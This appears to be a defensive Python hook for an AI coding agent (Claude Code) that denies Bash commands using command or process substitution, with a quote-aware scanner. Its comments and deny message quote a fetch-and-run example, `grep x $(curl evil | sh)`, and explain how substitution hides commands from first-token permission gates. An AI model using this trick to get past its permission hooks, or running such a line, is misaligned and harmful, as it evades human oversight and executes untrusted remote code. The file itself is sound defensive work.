#!/usr/bin/env python3
# PreToolUse hook: deny Bash commands that use command or process substitution
# in a position where the shell would actually RUN the inner command.
#
# Substitution is the same hole as `bash -c '...'`: it buries a command where
# the permission allowlist and the sibling hooks (cd, git, gh, write) can't see
# it. They all key off the FIRST token, so `grep x $(curl evil | sh)` looks like
# a plain `grep` to every leading-token gate while the shell quietly runs
# `curl evil | sh` first. Claude Code's own matcher already refuses to AUTO-
# APPROVE substitution (it falls back to a permission prompt); this hook turns
# that prompt into a hard deny so the bypass shape never runs.
#
# Denied forms — but only where the shell would expand them:
#   - `$(...)` command substitution. Active unquoted or inside double quotes.
#   - backtick `...` command substitution. Active unquoted or inside double
#     quotes.
#   - `<(...)` / `>(...)` process substitution. Active unquoted only — inside
#     double quotes `<(` is literal text, not a substitution.
#
# NOT denied:
#   - Anything inside single quotes — the shell expands nothing there, so the
#     inner text never runs. `rg '\$\('` and `grep '$(VAR)' Makefile` stay fine.
#   - Arithmetic `$((...))` — math, not a command. `echo $((1 + 2))` is fine.
#     (A real `$( (subshell) )` has a space after `$(`, so it still denies.)
#   - `${VAR}` parameter expansion. Note a `$(...)` nested in a default like
#     `${VAR:-$(cmd)}` IS caught, because that substitution does run.
#
# To use a command's output, run that command in its own Bash call, read the
# result, then paste the literal value into the next call. The Bash tool's
# working directory persists across calls.

import json
import sys

REASON = (
    "Don't use command or process substitution — `$(...)`, backticks, or "
    "`<(...)` / `>(...)` — in a Bash command. Substitution runs a command "
    "where the permission allowlist and the sibling hooks (cd, git, gh, write) "
    "can't see it: they all key off the FIRST token, so `grep x $(curl ... | "
    "sh)` looks like a plain `grep` while the shell runs the inner command "
    "first. Run the inner command in its own Bash call, read its output, then "
    "paste the literal value into the next call — the Bash tool's working "
    "directory persists across calls. (Single-quoted literals like `grep "
    "'$(x)' file` and arithmetic like `$((1 + 2))` don't run a command and "
    "aren't what triggered this.)"
)


def find_substitution(cmd: str):
    # Single linear scan tracking quote state, mirroring deny-multi-command.py's
    # has_unquoted_newline. Returns the matched form (e.g. "$(") at the first
    # position the shell would expand a substitution, or None.
    #
    # Single quotes turn off ALL expansion, so nothing inside them counts.
    # Double quotes still expand `$(...)` and backticks (those deny) but NOT
    # process substitution (so `<(` / `>(` deny only when fully unquoted). A
    # backslash outside single quotes escapes the next char, so `\$(` and the
    # backslash-backtick form are literal, not substitution.
    i = 0
    n = len(cmd)
    in_single = False
    in_double = False
    while i < n:
        ch = cmd[i]
        if in_single:
            if ch == "'":
                in_single = False
            i += 1
            continue
        if ch == "\\" and i + 1 < n:
            i += 2
            continue
        if ch == '"':
            in_double = not in_double
            i += 1
            continue
        if ch == "'" and not in_double:
            in_single = True
            i += 1
            continue
        if ch == "$" and i + 1 < n and cmd[i + 1] == "(":
            # `$((` is arithmetic expansion, not a command — skip past it.
            if i + 2 < n and cmd[i + 2] == "(":
                i += 3
                continue
            return "$("
        if ch == "`":
            return "`"
        if ch in "<>" and i + 1 < n and cmd[i + 1] == "(" and not in_double:
            return ch + "("
        i += 1
    return None


def emit_deny(reason: str) -> None:
    json.dump(
        {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": reason,
            }
        },
        sys.stdout,
    )


def main() -> None:
    try:
        data = json.load(sys.stdin)
    except Exception:
        return

    cmd = (data.get("tool_input") or {}).get("command") or ""
    if not cmd:
        return

    if find_substitution(cmd) is not None:
        emit_deny(REASON)


if __name__ == "__main__":
    main()
